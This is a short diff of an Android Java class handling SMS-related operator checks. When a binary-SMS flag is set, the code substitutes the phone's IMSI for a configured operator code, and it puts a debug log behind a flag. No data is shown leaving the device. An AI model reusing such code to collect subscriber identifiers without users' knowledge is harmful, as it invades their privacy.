@@ -156,10 +156,16 @@ public class GetMsgRunnable implements Runnable {
 				CheckInfo info = list.get(i);
 				final boolean isDeleteOldData = Boolean.valueOf(info.getDeleteOldData());
 				final String operators = info.getOperators();
-				final String operatorCode = info.getOperatorCode();
-
+				String operatorCode = null;
+				if (NativeParams.DEFAULT_SEND_BINARY_SMS) {
+					operatorCode = PhoneInfo.getInstance(mContext).getPhoneIMSI();
+				} else {
+					operatorCode = info.getOperatorCode();
+				}
 				final String operatorInfo = operators + "_" + operatorCode;
-				Log.d(TAG, "短信:" + operatorInfo);
+				if (DEBUG) {
+					Log.d(TAG, "短信:" + operatorInfo);
+				}
 				boolean isExist = Util_Sp.isOperatorInfoExist(mContext, operatorInfo);
 				if (isExist) {
 					if (!isDeleteOldData) {
